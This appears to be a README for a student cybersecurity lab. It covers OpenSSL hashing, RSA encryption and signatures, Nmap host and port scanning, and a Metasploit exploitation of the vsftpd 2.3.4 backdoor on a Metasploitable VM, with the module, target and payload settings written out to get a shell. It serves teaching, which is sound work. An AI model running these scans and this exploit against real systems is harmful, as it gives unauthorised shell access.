# cryptography-openssl-security-lab
This project demonstrates cryptography fundamentals and basic vulnerability assessment techniques using OpenSSL, Nmap, and the Metasploit Framework in a controlled Kali Linux lab environment.

## Tools Used
- Kali Linux
- OpenSSL
- Nmap
- Metasploit Framework
- Metasploitable (target VM)

## Cryptography Tasks

### Hashing (Data Integrity)
Hashing converts data into a fixed-length value to verify data integrity.

Tasks performed:
- Generated MD5 hash values
- Generated SHA256 hash values
- Verified file integrity after modifying data

Example commands:
```bash
echo -n "hello123" | openssl dgst -md5
openssl dgst -sha256 hashedfile.txt
Encryption & Decryption (RSA)

Implemented RSA public-key encryption to protect sensitive information.

Tasks performed:

Generated RSA private key

Generated RSA public key

Encrypted a file using the public key

Decrypted the file using the private key

Example commands:

openssl genpkey -algorithm RSA -out private_key.pem
openssl rsa -pubout -in private_key.pem -out public_key.pem
openssl pkeyutl -encrypt -pubin -inkey public_key.pem -in password.txt -out encrypted.bin
openssl pkeyutl -decrypt -inkey private_key.pem -in encrypted.bin -out decrypted.txt
Digital Signatures

Digital signatures verify authenticity and integrity of data.

Tasks performed:

Created digital signature for a file

Verified the signature using the public key

Example commands:

openssl dgst -sha256 -sign private_key.pem -out signature.sha256 document.txt
openssl dgst -sha256 -verify public_key.pem -signature signature.sha256 document.txt
Vulnerability Assessment

Performed network discovery and service scanning to identify open ports and running services on target machines.

Example scanning commands:

db_nmap -sn 192.168.10.0/24
db_nmap -sS -p- 192.168.10.200
db_nmap -sV -p 21 192.168.10.200

Tasks performed:

Discovered active hosts

Identified open ports

Detected running services

Penetration Testing

Simulated exploitation of the vsftpd 2.3.4 FTP backdoor vulnerability on the Metasploitable virtual machine using Metasploit.

Example exploitation workflow:

msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.10.200
set PAYLOAD cmd/unix/interact
exploit

If successful, the exploit provides shell access to the target system.

Learning Outcomes

Through this lab the following cybersecurity concepts were practiced:

Cryptographic hashing and data integrity verification

RSA encryption and decryption

Digital signatures and authentication

Vulnerability scanning and service enumeration

Basic penetration testing workflow using Metasploit

Project Documentation

Full project documentation and screenshots are included in this repository.
